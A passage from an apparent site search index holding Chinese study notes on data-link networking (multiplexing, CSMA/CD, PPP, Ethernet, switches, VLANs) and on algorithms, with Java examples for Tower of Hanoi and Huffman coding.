\u56E0\u4E3A\u4E0D\u4F1A\u53D1\u751F\u78B0\u649E\uFF0C\u56E0\u6B64\u4E5F\u6BD4\u8F83\u7B80\u5355\uFF0C\u4F7F\u7528 PPP \u534F\u8BAE\u8FDB\u884C\u63A7\u5236\u3002`},{header:"\u4FE1\u9053\u590D\u7528\u6280\u672F",slug:"\u4FE1\u9053\u590D\u7528\u6280\u672F",content:""},{header:"1. \u9891\u5206\u590D\u7528",slug:"_1-\u9891\u5206\u590D\u7528",content:`\u9891\u5206\u590D\u7528\u7684\u6240\u6709\u4E3B\u673A\u5728\u76F8\u540C\u7684\u65F6\u95F4\u5360\u7528\u4E0D\u540C\u7684\u9891\u7387\u5E26\u5BBD\u8D44\u6E90\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4aa5e057-bc57-4719-ab57-c6fbc861c505.png" width="350)`},{header:"2. \u65F6\u5206\u590D\u7528",slug:"_2-\u65F6\u5206\u590D\u7528",content:`\u65F6\u5206\u590D\u7528\u7684\u6240\u6709\u4E3B\u673A\u5728\u4E0D\u540C\u7684\u65F6\u95F4\u5360\u7528\u76F8\u540C\u7684\u9891\u7387\u5E26\u5BBD\u8D44\u6E90\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/67582ade-d44a-46a6-8757-3c1296cc1ef9.png" width="350)
\u4F7F\u7528\u9891\u5206\u590D\u7528\u548C\u65F6\u5206\u590D\u7528\u8FDB\u884C\u901A\u4FE1\uFF0C\u5728\u901A\u4FE1\u7684\u8FC7\u7A0B\u4E2D\u4E3B\u673A\u4F1A\u4E00\u76F4\u5360\u7528\u4E00\u90E8\u5206\u4FE1\u9053\u8D44\u6E90\u3002\u4F46\u662F\u7531\u4E8E\u8BA1\u7B97\u673A\u6570\u636E\u7684\u7A81\u53D1\u6027\u8D28\uFF0C\u901A\u4FE1\u8FC7\u7A0B\u6CA1\u5FC5\u8981\u4E00\u76F4\u5360\u7528\u4FE1\u9053\u8D44\u6E90\u800C\u4E0D\u8BA9\u51FA\u7ED9\u5176\u5B83\u7528\u6237\u4F7F\u7528\uFF0C\u56E0\u6B64\u8FD9\u4E24\u79CD\u65B9\u5F0F\u5BF9\u4FE1\u9053\u7684\u5229\u7528\u7387\u90FD\u4E0D\u9AD8\u3002`},{header:"3. \u7EDF\u8BA1\u65F6\u5206\u590D\u7528",slug:"_3-\u7EDF\u8BA1\u65F6\u5206\u590D\u7528",content:`\u662F\u5BF9\u65F6\u5206\u590D\u7528\u7684\u4E00\u79CD\u6539\u8FDB\uFF0C\u4E0D\u56FA\u5B9A\u6BCF\u4E2A\u7528\u6237\u5728\u65F6\u5206\u590D\u7528\u5E27\u4E2D\u7684\u4F4D\u7F6E\uFF0C\u53EA\u8981\u6709\u6570\u636E\u5C31\u96C6\u4E2D\u8D77\u6765\u7EC4\u6210\u7EDF\u8BA1\u65F6\u5206\u590D\u7528\u5E27\u7136\u540E\u53D1\u9001\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6283be2a-814a-4a10-84bf-9592533fe6bc.png" width="350)`},{header:"4. \u6CE2\u5206\u590D\u7528",slug:"_4-\u6CE2\u5206\u590D\u7528",content:"\u5149\u7684\u9891\u5206\u590D\u7528\u3002\u7531\u4E8E\u5149\u7684\u9891\u7387\u5F88\u9AD8\uFF0C\u56E0\u6B64\u4E60\u60EF\u4E0A\u7528\u6CE2\u957F\u800C\u4E0D\u662F\u9891\u7387\u6765\u8868\u793A\u6240\u4F7F\u7528\u7684\u5149\u8F7D\u6CE2\u3002"},{header:"5. \u7801\u5206\u590D\u7528",slug:"_5-\u7801\u5206\u590D\u7528",content:`\u4E3A\u6BCF\u4E2A\u7528\u6237\u5206\u914D m bit \u7684\u7801\u7247\uFF0C\u5E76\u4E14\u6240\u6709\u7684\u7801\u7247\u6B63\u4EA4\uFF0C\u5BF9\u4E8E\u4EFB\u610F\u4E24\u4E2A\u7801\u7247 ![img](https://latex.codecogs.com/gif.latex?\\vec{S}" class="mathjax-pic) \u548C ![img](https://latex.codecogs.com/gif.latex?\\vec{T}" class="mathjax-pic) \u6709 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/308a02e9-3346-4251-8c41-bd5536dab491.png" width="100px">
\u4E3A\u4E86\u8BA8\u8BBA\u65B9\u4FBF\uFF0C\u53D6 m=8\uFF0C\u8BBE\u7801\u7247 ![img](https://latex.codecogs.com/gif.latex?\\vec{S}" class="mathjax-pic) \u4E3A 00011011\u3002\u5728\u62E5\u6709\u8BE5\u7801\u7247\u7684\u7528\u6237\u53D1\u9001\u6BD4\u7279 1 \u65F6\u5C31\u53D1\u9001\u8BE5\u7801\u7247\uFF0C\u53D1\u9001\u6BD4\u7279 0 \u65F6\u5C31\u53D1\u9001\u8BE5\u7801\u7247\u7684\u53CD\u7801 11100100\u3002
\u5728\u8BA1\u7B97\u65F6\u5C06 00011011 \u8BB0\u4F5C (-1 -1 -1 +1 +1 -1 +1 +1)\uFF0C\u53EF\u4EE5\u5F97\u5230 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6fda1dc7-5c74-49c1-bb79-237a77e43a43.png" width="100px">
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e325a903-f0b1-4fbd-82bf-88913dc2f290.png" width="125px">
\u5176\u4E2D ![img](https://latex.codecogs.com/gif.latex?\\vec{S'}" class="mathjax-pic) \u4E3A ![img](https://latex.codecogs.com/gif.latex?\\vec{S}" class="mathjax-pic) \u7684\u53CD\u7801\u3002
\u5229\u7528\u4E0A\u9762\u7684\u5F0F\u5B50\u6211\u4EEC\u77E5\u9053\uFF0C\u5F53\u63A5\u6536\u7AEF\u4F7F\u7528\u7801\u7247 ![img](https://latex.codecogs.com/gif.latex?\\vec{S}" class="mathjax-pic) \u5BF9\u63A5\u6536\u5230\u7684\u6570\u636E\u8FDB\u884C\u5185\u79EF\u8FD0\u7B97\u65F6\uFF0C\u7ED3\u679C\u4E3A 0 \u7684\u662F\u5176\u5B83\u7528\u6237\u53D1\u9001\u7684\u6570\u636E\uFF0C\u7ED3\u679C\u4E3A 1 \u7684\u662F\u7528\u6237\u53D1\u9001\u7684\u6BD4\u7279 1\uFF0C\u7ED3\u679C\u4E3A -1 \u7684\u662F\u7528\u6237\u53D1\u9001\u7684\u6BD4\u7279 0\u3002
\u7801\u5206\u590D\u7528\u9700\u8981\u53D1\u9001\u7684\u6570\u636E\u91CF\u4E3A\u539F\u5148\u7684 m \u500D\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/99b6060e-099d-4201-8e86-f8ab3768a7cf.png" width="500px">`},{header:"CSMA/CD \u534F\u8BAE",slug:"csma-cd-\u534F\u8BAE",content:`CSMA/CD \u8868\u793A\u8F7D\u6CE2\u76D1\u542C\u591A\u70B9\u63A5\u5165 / \u78B0\u649E\u68C0\u6D4B\u3002 \u591A\u70B9\u63A5\u5165 \uFF1A\u8BF4\u660E\u8FD9\u662F\u603B\u7EBF\u578B\u7F51\u7EDC\uFF0C\u8BB8\u591A\u4E3B\u673A\u4EE5\u591A\u70B9\u7684\u65B9\u5F0F\u8FDE\u63A5\u5230\u603B\u7EBF\u4E0A\u3002
\u8F7D\u6CE2\u76D1\u542C \uFF1A\u6BCF\u4E2A\u4E3B\u673A\u90FD\u5FC5\u987B\u4E0D\u505C\u5730\u76D1\u542C\u4FE1\u9053\u3002\u5728\u53D1\u9001\u524D\uFF0C\u5982\u679C\u76D1\u542C\u5230\u4FE1\u9053\u6B63\u5728\u4F7F\u7528\uFF0C\u5C31\u5FC5\u987B\u7B49\u5F85\u3002
\u78B0\u649E\u68C0\u6D4B \uFF1A\u5728\u53D1\u9001\u4E2D\uFF0C\u5982\u679C\u76D1\u542C\u5230\u4FE1\u9053\u5DF2\u6709\u5176\u5B83\u4E3B\u673A\u6B63\u5728\u53D1\u9001\u6570\u636E\uFF0C\u5C31\u8868\u793A\u53D1\u751F\u4E86\u78B0\u649E\u3002\u867D\u7136\u6BCF\u4E2A\u4E3B\u673A\u5728\u53D1\u9001\u6570\u636E\u4E4B\u524D\u90FD\u5DF2\u7ECF\u76D1\u542C\u5230\u4FE1\u9053\u4E3A\u7A7A\u95F2\uFF0C\u4F46\u662F\u7531\u4E8E\u7535\u78C1\u6CE2\u7684\u4F20\u64AD\u65F6\u5EF6\u7684\u5B58\u5728\uFF0C\u8FD8\u662F\u6709\u53EF\u80FD\u4F1A\u53D1\u751F\u78B0\u649E\u3002 \u8BB0\u7AEF\u5230\u7AEF\u7684\u4F20\u64AD\u65F6\u5EF6\u4E3A \u03C4\uFF0C\u6700\u5148\u53D1\u9001\u7684\u7AD9\u70B9\u6700\u591A\u7ECF\u8FC7 2\u03C4 \u5C31\u53EF\u4EE5\u77E5\u9053\u662F\u5426\u53D1\u751F\u4E86\u78B0\u649E\uFF0C\u79F0 2\u03C4 \u4E3A \u4E89\u7528\u671F \u3002\u53EA\u6709\u7ECF\u8FC7\u4E89\u7528\u671F\u4E4B\u540E\u8FD8\u6CA1\u6709\u68C0\u6D4B\u5230\u78B0\u649E\uFF0C\u624D\u80FD\u80AF\u5B9A\u8FD9\u6B21\u53D1\u9001\u4E0D\u4F1A\u53D1\u751F\u78B0\u649E\u3002
\u5F53\u53D1\u751F\u78B0\u649E\u65F6\uFF0C\u7AD9\u70B9\u8981\u505C\u6B62\u53D1\u9001\uFF0C\u7B49\u5F85\u4E00\u6BB5\u65F6\u95F4\u518D\u53D1\u9001\u3002\u8FD9\u4E2A\u65F6\u95F4\u91C7\u7528 \u622A\u65AD\u4E8C\u8FDB\u5236\u6307\u6570\u9000\u907F\u7B97\u6CD5 \u6765\u786E\u5B9A\u3002\u4ECE\u79BB\u6563\u7684\u6574\u6570\u96C6\u5408 {0, 1, .., (2k-1)} \u4E2D\u968F\u673A\u53D6\u51FA\u4E00\u4E2A\u6570\uFF0C\u8BB0\u4F5C r\uFF0C\u7136\u540E\u53D6 r \u500D\u7684\u4E89\u7528\u671F\u4F5C\u4E3A\u91CD\u4F20\u7B49\u5F85\u65F6\u95F4\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/19d423e9-74f7-4c2b-9b97-55890e0d5193.png" width="400)`},{header:"PPP \u534F\u8BAE",slug:"ppp-\u534F\u8BAE",content:`\u4E92\u8054\u7F51\u7528\u6237\u901A\u5E38\u9700\u8981\u8FDE\u63A5\u5230\u67D0\u4E2A ISP \u4E4B\u540E\u624D\u80FD\u63A5\u5165\u5230\u4E92\u8054\u7F51\uFF0CPPP \u534F\u8BAE\u662F\u7528\u6237\u8BA1\u7B97\u673A\u548C ISP \u8FDB\u884C\u901A\u4FE1\u65F6\u6240\u4F7F\u7528\u7684\u6570\u636E\u94FE\u8DEF\u5C42\u534F\u8BAE\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e1ab9f28-cb15-4178-84b2-98aad87f9bc8.jpg" width="300)
PPP \u7684\u5E27\u683C\u5F0F\uFF1A F \u5B57\u6BB5\u4E3A\u5E27\u7684\u5B9A\u754C\u7B26
A \u548C C \u5B57\u6BB5\u6682\u65F6\u6CA1\u6709\u610F\u4E49
FCS \u5B57\u6BB5\u662F\u4F7F\u7528 CRC \u7684\u68C0\u9A8C\u5E8F\u5217
\u4FE1\u606F\u90E8\u5206\u7684\u957F\u5EA6\u4E0D\u8D85\u8FC7 1500 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/759013d7-61d8-4509-897a-d75af598a236.png" width="400)`},{header:"MAC \u5730\u5740",slug:"mac-\u5730\u5740",content:`MAC \u5730\u5740\u662F\u94FE\u8DEF\u5C42\u5730\u5740\uFF0C\u957F\u5EA6\u4E3A 6 \u5B57\u8282\uFF0848 \u4F4D\uFF09\uFF0C\u7528\u4E8E\u552F\u4E00\u6807\u8BC6\u7F51\u7EDC\u9002\u914D\u5668\uFF08\u7F51\u5361\uFF09\u3002
\u4E00\u53F0\u4E3B\u673A\u62E5\u6709\u591A\u5C11\u4E2A\u7F51\u7EDC\u9002\u914D\u5668\u5C31\u6709\u591A\u5C11\u4E2A MAC \u5730\u5740\u3002\u4F8B\u5982\u7B14\u8BB0\u672C\u7535\u8111\u666E\u904D\u5B58\u5728\u65E0\u7EBF\u7F51\u7EDC\u9002\u914D\u5668\u548C\u6709\u7EBF\u7F51\u7EDC\u9002\u914D\u5668\uFF0C\u56E0\u6B64\u5C31\u6709\u4E24\u4E2A MAC \u5730\u5740\u3002`},{header:"\u5C40\u57DF\u7F51",slug:"\u5C40\u57DF\u7F51",content:`\u5C40\u57DF\u7F51\u662F\u4E00\u79CD\u5178\u578B\u7684\u5E7F\u64AD\u4FE1\u9053\uFF0C\u4E3B\u8981\u7279\u70B9\u662F\u7F51\u7EDC\u4E3A\u4E00\u4E2A\u5355\u4F4D\u6240\u62E5\u6709\uFF0C\u4E14\u5730\u7406\u8303\u56F4\u548C\u7AD9\u70B9\u6570\u76EE\u5747\u6709\u9650\u3002
\u4E3B\u8981\u6709\u4EE5\u592A\u7F51\u3001\u4EE4\u724C\u73AF\u7F51\u3001FDDI \u548C ATM \u7B49\u5C40\u57DF\u7F51\u6280\u672F\uFF0C\u76EE\u524D\u4EE5\u592A\u7F51\u5360\u9886\u7740\u6709\u7EBF\u5C40\u57DF\u7F51\u5E02\u573A\u3002
\u53EF\u4EE5\u6309\u7167\u7F51\u7EDC\u62D3\u6251\u7ED3\u6784\u5BF9\u5C40\u57DF\u7F51\u8FDB\u884C\u5206\u7C7B\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/807f4258-dba8-4c54-9c3c-a707c7ccffa2.jpg" width="800)`},{header:"\u4EE5\u592A\u7F51",slug:"\u4EE5\u592A\u7F51",content:`\u4EE5\u592A\u7F51\u662F\u4E00\u79CD\u661F\u578B\u62D3\u6251\u7ED3\u6784\u5C40\u57DF\u7F51\u3002
\u65E9\u671F\u4F7F\u7528\u96C6\u7EBF\u5668\u8FDB\u884C\u8FDE\u63A5\uFF0C\u96C6\u7EBF\u5668\u662F\u4E00\u79CD\u7269\u7406\u5C42\u8BBE\u5907\uFF0C \u4F5C\u7528\u4E8E\u6BD4\u7279\u800C\u4E0D\u662F\u5E27\uFF0C\u5F53\u4E00\u4E2A\u6BD4\u7279\u5230\u8FBE\u63A5\u53E3\u65F6\uFF0C\u96C6\u7EBF\u5668\u91CD\u65B0\u751F\u6210\u8FD9\u4E2A\u6BD4\u7279\uFF0C\u5E76\u5C06\u5176\u80FD\u91CF\u5F3A\u5EA6\u653E\u5927\uFF0C\u4ECE\u800C\u6269\u5927\u7F51\u7EDC\u7684\u4F20\u8F93\u8DDD\u79BB\uFF0C\u4E4B\u540E\u518D\u5C06\u8FD9\u4E2A\u6BD4\u7279\u53D1\u9001\u5230\u5176\u5B83\u6240\u6709\u63A5\u53E3\u3002\u5982\u679C\u96C6\u7EBF\u5668\u540C\u65F6\u6536\u5230\u4E24\u4E2A\u4E0D\u540C\u63A5\u53E3\u7684\u5E27\uFF0C\u90A3\u4E48\u5C31\u53D1\u751F\u4E86\u78B0\u649E\u3002
\u76EE\u524D\u4EE5\u592A\u7F51\u4F7F\u7528\u4EA4\u6362\u673A\u66FF\u4EE3\u4E86\u96C6\u7EBF\u5668\uFF0C\u4EA4\u6362\u673A\u662F\u4E00\u79CD\u94FE\u8DEF\u5C42\u8BBE\u5907\uFF0C\u5B83\u4E0D\u4F1A\u53D1\u751F\u78B0\u649E\uFF0C\u80FD\u6839\u636E MAC \u5730\u5740\u8FDB\u884C\u5B58\u50A8\u8F6C\u53D1\u3002
\u4EE5\u592A\u7F51\u5E27\u683C\u5F0F\uFF1A \u7C7B\u578B \uFF1A\u6807\u8BB0\u4E0A\u5C42\u4F7F\u7528\u7684\u534F\u8BAE\uFF1B
\u6570\u636E \uFF1A\u957F\u5EA6\u5728 46-1500 \u4E4B\u95F4\uFF0C\u5982\u679C\u592A\u5C0F\u5219\u9700\u8981\u586B\u5145\uFF1B
FCS \uFF1A\u5E27\u68C0\u9A8C\u5E8F\u5217\uFF0C\u4F7F\u7528\u7684\u662F CRC \u68C0\u9A8C\u65B9\u6CD5\uFF1B ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/164944d3-bbd2-4bb2-924b-e62199c51b90.png" width="500)`},{header:"\u4EA4\u6362\u673A",slug:"\u4EA4\u6362\u673A",content:`\u4EA4\u6362\u673A\u5177\u6709\u81EA\u5B66\u4E60\u80FD\u529B\uFF0C\u5B66\u4E60\u7684\u662F\u4EA4\u6362\u8868\u7684\u5185\u5BB9\uFF0C\u4EA4\u6362\u8868\u4E2D\u5B58\u50A8\u7740 MAC \u5730\u5740\u5230\u63A5\u53E3\u7684\u6620\u5C04\u3002
\u6B63\u662F\u7531\u4E8E\u8FD9\u79CD\u81EA\u5B66\u4E60\u80FD\u529B\uFF0C\u56E0\u6B64\u4EA4\u6362\u673A\u662F\u4E00\u79CD\u5373\u63D2\u5373\u7528\u8BBE\u5907\uFF0C\u4E0D\u9700\u8981\u7F51\u7EDC\u7BA1\u7406\u5458\u624B\u52A8\u914D\u7F6E\u4EA4\u6362\u8868\u5185\u5BB9\u3002
\u4E0B\u56FE\u4E2D\uFF0C\u4EA4\u6362\u673A\u6709 4 \u4E2A\u63A5\u53E3\uFF0C\u4E3B\u673A A \u5411\u4E3B\u673A B \u53D1\u9001\u6570\u636E\u5E27\u65F6\uFF0C\u4EA4\u6362\u673A\u628A\u4E3B\u673A A \u5230\u63A5\u53E3 1 \u7684\u6620\u5C04\u5199\u5165\u4EA4\u6362\u8868\u4E2D\u3002\u4E3A\u4E86\u53D1\u9001\u6570\u636E\u5E27\u5230 B\uFF0C\u5148\u67E5\u4EA4\u6362\u8868\uFF0C\u6B64\u65F6\u6CA1\u6709\u4E3B\u673A B \u7684\u8868\u9879\uFF0C\u90A3\u4E48\u4E3B\u673A A \u5C31\u53D1\u9001\u5E7F\u64AD\u5E27\uFF0C\u4E3B\u673A C \u548C\u4E3B\u673A D \u4F1A\u4E22\u5F03\u8BE5\u5E27\uFF0C\u4E3B\u673A B \u56DE\u5E94\u8BE5\u5E27\u5411\u4E3B\u673A A \u53D1\u9001\u6570\u636E\u5305\u65F6\uFF0C\u4EA4\u6362\u673A\u67E5\u627E\u4EA4\u6362\u8868\u5F97\u5230\u4E3B\u673A A \u6620\u5C04\u7684\u63A5\u53E3\u4E3A 1\uFF0C\u5C31\u53D1\u9001\u6570\u636E\u5E27\u5230\u63A5\u53E3 1\uFF0C\u540C\u65F6\u4EA4\u6362\u673A\u6DFB\u52A0\u4E3B\u673A B \u5230\u63A5\u53E3 2 \u7684\u6620\u5C04\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a4444545-0d68-4015-9a3d-19209dc436b3.png" width="800)`},{header:"\u865A\u62DF\u5C40\u57DF\u7F51",slug:"\u865A\u62DF\u5C40\u57DF\u7F51",content:`\u865A\u62DF\u5C40\u57DF\u7F51\u53EF\u4EE5\u5EFA\u7ACB\u4E0E\u7269\u7406\u4F4D\u7F6E\u65E0\u5173\u7684\u903B\u8F91\u7EC4\uFF0C\u53EA\u6709\u5728\u540C\u4E00\u4E2A\u865A\u62DF\u5C40\u57DF\u7F51\u4E2D\u7684\u6210\u5458\u624D\u4F1A\u6536\u5230\u94FE\u8DEF\u5C42\u5E7F\u64AD\u4FE1\u606F\u3002
\u4F8B\u5982\u4E0B\u56FE\u4E2D (A1, A2, A3, A4) \u5C5E\u4E8E\u4E00\u4E2A\u865A\u62DF\u5C40\u57DF\u7F51\uFF0CA1 \u53D1\u9001\u7684\u5E7F\u64AD\u4F1A\u88AB A2\u3001A3\u3001A4 \u6536\u5230\uFF0C\u800C\u5176\u5B83\u7AD9\u70B9\u6536\u4E0D\u5230\u3002
\u4F7F\u7528 VLAN \u5E72\u7EBF\u8FDE\u63A5\u6765\u5EFA\u7ACB\u865A\u62DF\u5C40\u57DF\u7F51\uFF0C\u6BCF\u53F0\u4EA4\u6362\u673A\u4E0A\u7684\u4E00\u4E2A\u7279\u6B8A\u63A5\u53E3\u88AB\u8BBE\u7F6E\u4E3A\u5E72\u7EBF\u63A5\u53E3\uFF0C\u4EE5\u4E92\u8FDE VLAN \u4EA4\u6362\u673A\u3002IEEE \u5B9A\u4E49\u4E86\u4E00\u79CD\u6269\u5C55\u7684\u4EE5\u592A\u7F51\u5E27\u683C\u5F0F 802.1Q\uFF0C\u5B83\u5728\u6807\u51C6\u4EE5\u592A\u7F51\u5E27\u4E0A\u52A0\u8FDB\u4E86 4 \u5B57\u8282\u9996\u90E8 VLAN \u6807\u7B7E\uFF0C\u7528\u4E8E\u8868\u793A\u8BE5\u5E27\u5C5E\u4E8E\u54EA\u4E00\u4E2A\u865A\u62DF\u5C40\u57DF\u7F51\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e98e9d20-206b-4533-bacf-3448d0096f38.png" width="500)`}]},{path:"/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.html",title:"",pathLocale:"/",contents:[{header:"",slug:"",content:"\u8BA1\u7B97\u673A\u7F51\u7EDC.md"}]},{path:"/%E7%AE%97%E6%B3%95/",title:"\u7B97\u6CD5",pathLocale:"/",contents:[{header:"\u7B97\u6CD5",slug:"\u7B97\u6CD5",content:""}]},{path:"/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%20-%20%E5%85%B6%E5%AE%83.html",title:"\u7B97\u6CD5 - \u5176\u5B83",pathLocale:"/",contents:[{header:"\u7B97\u6CD5 - \u5176\u5B83",slug:"\u7B97\u6CD5-\u5176\u5B83",content:""},{header:"\u6C49\u8BFA\u5854",slug:"\u6C49\u8BFA\u5854",content:`![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/69d6c38d-1dec-4f72-ae60-60dbc10e9d15.png" width="300)
\u6709\u4E09\u4E2A\u67F1\u5B50\uFF0C\u5206\u522B\u4E3A from\u3001buffer\u3001to\u3002\u9700\u8981\u5C06 from \u4E0A\u7684\u5706\u76D8\u5168\u90E8\u79FB\u52A8\u5230 to \u4E0A\uFF0C\u5E76\u4E14\u8981\u4FDD\u8BC1\u5C0F\u5706\u76D8\u59CB\u7EC8\u5728\u5927\u5706\u76D8\u4E0A\u3002
\u8FD9\u662F\u4E00\u4E2A\u7ECF\u5178\u7684\u9012\u5F52\u95EE\u9898\uFF0C\u5206\u4E3A\u4E09\u6B65\u6C42\u89E3\uFF1A
\u2460 \u5C06 n-1 \u4E2A\u5706\u76D8\u4ECE from -> buffer
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f9240aa1-8d48-4959-b28a-7ca45c3e4d91.png" width="300)
\u2461 \u5C06 1 \u4E2A\u5706\u76D8\u4ECE from -> to
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f579cab0-3d49-4d00-8e14-e9e1669d0f9f.png" width="300)
\u2462 \u5C06 n-1 \u4E2A\u5706\u76D8\u4ECE buffer -> to
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d02f74dd-8e33-4f3c-bf29-53203a06695a.png" width="300)
\u5982\u679C\u53EA\u6709\u4E00\u4E2A\u5706\u76D8\uFF0C\u90A3\u4E48\u53EA\u9700\u8981\u8FDB\u884C\u4E00\u6B21\u79FB\u52A8\u64CD\u4F5C\u3002
\u4ECE\u4E0A\u9762\u7684\u8BA8\u8BBA\u53EF\u4EE5\u77E5\u9053\uFF0Can = 2 * an-1 + 1\uFF0C\u663E\u7136 an = 2n - 1\uFF0Cn \u4E2A\u5706\u76D8\u9700\u8981\u79FB\u52A8 2n - 1 \u6B21\u3002
public class Hanoi { public static void move(int n, String from, String buffer, String to) { if (n == 1) { System.out.println("from " + from + " to " + to); return; } move(n - 1, from, to, buffer); move(1, from, buffer, to); move(n - 1, buffer, from, to); } public static void main(String[] args) { Hanoi.move(3, "H1", "H2", "H3"); }
}
from H1 to H3
from H1 to H2
from H3 to H2
from H1 to H3
from H2 to H1
from H2 to H3
from H1 to H3`},{header:"\u54C8\u592B\u66FC\u7F16\u7801",slug:"\u54C8\u592B\u66FC\u7F16\u7801",content:`\u6839\u636E\u6570\u636E\u51FA\u73B0\u7684\u9891\u7387\u5BF9\u6570\u636E\u8FDB\u884C\u7F16\u7801\uFF0C\u4ECE\u800C\u538B\u7F29\u539F\u59CB\u6570\u636E\u3002
\u4F8B\u5982\u5BF9\u4E8E\u4E00\u4E2A\u6587\u672C\u6587\u4EF6\uFF0C\u5176\u4E2D\u5404\u79CD\u5B57\u7B26\u51FA\u73B0\u7684\u6B21\u6570\u5982\u4E0B\uFF1A a : 10
b : 20
c : 40
d : 80 \u53EF\u4EE5\u5C06\u6BCF\u79CD\u5B57\u7B26\u8F6C\u6362\u6210\u4E8C\u8FDB\u5236\u7F16\u7801\uFF0C\u4F8B\u5982\u5C06 a \u8F6C\u6362\u4E3A 00\uFF0Cb \u8F6C\u6362\u4E3A 01\uFF0Cc \u8F6C\u6362\u4E3A 10\uFF0Cd \u8F6C\u6362\u4E3A 11\u3002\u8FD9\u662F\u6700\u7B80\u5355\u7684\u4E00\u79CD\u7F16\u7801\u65B9\u5F0F\uFF0C\u6CA1\u6709\u8003\u8651\u5404\u4E2A\u5B57\u7B26\u7684\u6743\u503C\uFF08\u51FA\u73B0\u9891\u7387\uFF09\u3002\u800C\u54C8\u592B\u66FC\u7F16\u7801\u91C7\u7528\u4E86\u8D2A\u5FC3\u7B56\u7565\uFF0C\u4F7F\u51FA\u73B0\u9891\u7387\u6700\u9AD8\u7684\u5B57\u7B26\u7684\u7F16\u7801\u6700\u77ED\uFF0C\u4ECE\u800C\u4FDD\u8BC1\u6574\u4F53\u7684\u7F16\u7801\u957F\u5EA6\u6700\u77ED\u3002
\u9996\u5148\u751F\u6210\u4E00\u9897\u54C8\u592B\u66FC\u6811\uFF0C\u6BCF\u6B21\u751F\u6210\u8FC7\u7A0B\u4E2D\u9009\u53D6\u9891\u7387\u6700\u5C11\u7684\u4E24\u4E2A\u8282\u70B9\uFF0C\u751F\u6210\u4E00\u4E2A\u65B0\u8282\u70B9\u4F5C\u4E3A\u5B83\u4EEC\u7684\u7236\u8282\u70B9\uFF0C\u5E76\u4E14\u65B0\u8282\u70B9\u7684\u9891\u7387\u4E3A\u4E24\u4E2A\u8282\u70B9\u7684\u548C\u3002\u9009\u53D6\u9891\u7387\u6700\u5C11\u7684\u539F\u56E0\u662F\uFF0C\u751F\u6210\u8FC7\u7A0B\u4F7F\u5F97\u5148\u9009\u53D6\u7684\u8282\u70B9\u4F4D\u4E8E\u6811\u7684\u66F4\u4F4E\u5C42\uFF0C\u90A3\u4E48\u9700\u8981\u7684\u7F16\u7801\u957F\u5EA6\u66F4\u957F\uFF0C\u9891\u7387\u66F4\u5C11\u53EF\u4EE5\u4F7F\u5F97\u603B\u7F16\u7801\u957F\u5EA6\u66F4\u5C11\u3002
\u751F\u6210\u7F16\u7801\u65F6\uFF0C\u4ECE\u6839\u8282\u70B9\u51FA\u53D1\uFF0C\u5411\u5DE6\u904D\u5386\u5219\u6DFB\u52A0\u4E8C\u8FDB\u5236\u4F4D 0\uFF0C\u5411\u53F3\u5219\u6DFB\u52A0\u4E8C\u8FDB\u5236\u4F4D 1\uFF0C\u76F4\u5230\u904D\u5386\u5230\u53F6\u5B50\u8282\u70B9\uFF0C\u53F6\u5B50\u8282\u70B9\u4EE3\u8868\u7684\u5B57\u7B26\u7684\u7F16\u7801\u5C31\u662F\u8FD9\u4E2A\u8DEF\u5F84\u7F16\u7801\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8edc5164-810b-4cc5-bda8-2a2c98556377.jpg" width="300)
public class Huffman { private class Node implements Comparable<Node> { char ch; int freq; boolean isLeaf; Node left, right; public Node(char ch, int freq) { this.ch = ch; this.freq = freq; isLeaf = true; } public Node(Node left, Node right, int freq) { this.left = left; this.right = right; this.freq = freq; isLeaf = false; } @Override public int compareTo(Node o) { return this.freq - o.freq; } } public Map<Character, String> encode(Map<Character, Integer> frequencyForChar) { PriorityQueue<Node> priorityQueue = new PriorityQueue<>(); for (Character c : frequencyForChar.keySet()) { priorityQueue.add(new Node(c, frequencyForChar.get(c))); } while (priorityQueue.size() != 1) { Node node1 = priorityQueue.poll(); Node node2 = priorityQueue.poll(); priorityQueue.add(new Node(node1, node2, node1.freq + node2.freq)); } return encode(priorityQueue.poll()); } private Map<Character, String> encode(Node root) { Map<Character, String> encodingForChar = new HashMap<>(); encode(root, "", encodingForChar); return encodingForChar; } private void encode(Node node, String encoding, Map<Character, String> encodingForChar) { if (node.isLeaf) { encodingForChar.put(node.ch, encoding); return; } encode(node.left, encoding + '0', encodingForChar); encode(node.right, encoding + '1', encodingForChar); }
}`}]},{path:"/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%20-%20%E5%B9%B6%E6%9F%A5%E9%9B%86.html",title:"\u7B97\u6CD5 - \u5E76\u67E5\u96C6",pathLocale:"/",contents:[{header:"\u7B97\u6CD5 - \u5E76\u67E5\u96C6",slug:"\u7B97\u6CD5-\u5E76\u67E5\u96C6",content:`\u7B97\u6CD5 - \u5E76\u67E5\u96C6 \u524D\u8A00
Quick Find
Quick Union
\u52A0\u6743 Quick Union
\u8DEF\u5F84\u538B\u7F29\u7684\u52A0\u6743 Quick Union
